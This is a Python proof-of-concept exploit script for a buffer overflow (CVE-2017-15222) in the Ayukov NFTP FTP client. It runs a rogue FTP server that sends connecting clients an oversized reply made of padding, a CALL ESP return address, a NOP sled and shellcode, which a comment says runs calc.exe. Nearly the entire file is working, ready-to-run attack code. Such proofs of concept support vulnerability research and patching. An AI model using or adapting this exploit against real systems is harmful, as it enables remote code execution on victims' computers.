#!/usr/bin/env python
# coding: utf-8

############ Description: ##########
# The vulnerability was discovered during a vulnerability research lecture.
# This is meant to be a PoC.
####################################

# Exploit Title: Ayukov NFTP FTP Client - Buffer Overflow
# Date: 2017-10-21
# Exploit Author: Berk Cem Göksel
# Contact: twitter.com/berkcgoksel || bgoksel.com
# Vendor Homepage: http://ayukov.com/nftp/source-release.html
# Software Link: ftp://ftp.ayukov.com/pub/nftp/
# Version:  v1.71, v1.72, v1.8, v2.0
# Tested on: Windows 10
# Category: Windows Remote Exploit
# CVE : CVE-2017-15222

import socket

IP = '127.0.0.1'
port = 21


#(exec calc.exe)
shellcode=(
"\xda\xc5\xbe\xda\xc6\x9a\xb6\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x33\x83\xc5\x04\x31\x75\x13\x03\xaf\xd5\x78\x43\xb3\x32\xf5"
"\xac\x4b\xc3\x66\x24\xae\xf2\xb4\x52\xbb\xa7\x08\x10\xe9\x4b"
"\xe2\x74\x19\xdf\x86\x50\x2e\x68\x2c\x87\x01\x69\x80\x07\xcd"
"\xa9\x82\xfb\x0f\xfe\x64\xc5\xc0\xf3\x65\x02\x3c\xfb\x34\xdb"
"\x4b\xae\xa8\x68\x09\x73\xc8\xbe\x06\xcb\xb2\xbb\xd8\xb8\x08"
"\xc5\x08\x10\x06\x8d\xb0\x1a\x40\x2e\xc1\xcf\x92\x12\x88\x64"
"\x60\xe0\x0b\xad\xb8\x09\x3a\x91\x17\x34\xf3\x1c\x69\x70\x33"
"\xff\x1c\x8a\x40\x82\x26\x49\x3b\x58\xa2\x4c\x9b\x2b\x14\xb5"
"\x1a\xff\xc3\x3e\x10\xb4\x80\x19\x34\x4b\x44\x12\x40\xc0\x6b"
"\xf5\xc1\x92\x4f\xd1\x8a\x41\xf1\x40\x76\x27\x0e\x92\xde\x98"
"\xaa\xd8\xcc\xcd\xcd\x82\x9a\x10\x5f\xb9\xe3\x13\x5f\xc2\x43"
"\x7c\x6e\x49\x0c\xfb\x6f\x98\x69\xf3\x25\x81\xdb\x9c\xe3\x53"
"\x5e\xc1\x13\x8e\x9c\xfc\x97\x3b\x5c\xfb\x88\x49\x59\x47\x0f"
"\xa1\x13\xd8\xfa\xc5\x80\xd9\x2e\xa6\x47\x4a\xb2\x07\xe2\xea"
"\x51\x58")

CALL_ESP = "\xdd\xfc\x40\x00" # call esp - nftpc.exe  #0040FCDD
buff = "A" * 4116 + CALL_ESP + '\x90' * 16 + shellcode + "C" * (15000-4116-4-16-len(shellcode))
#Can call esp but the null byte terminates the string.

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((IP, port))
        s.listen(20)
        print("[i] FTP Server started on port: "+str(port)+"\r\n")
except:
        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")

while True:
    conn, addr = s.accept()
    conn.send('220 Welcome!' + '\r\n')
    print conn.recv(1024)
    conn.send('331 OK.\r\n')
    print conn.recv(1024)
    conn.send('230 OK.\r\n')
    print conn.recv(1024)
    conn.send(buff + '\r\n')
    print conn.recv(1024)
    conn.send('257' + '\r\n')


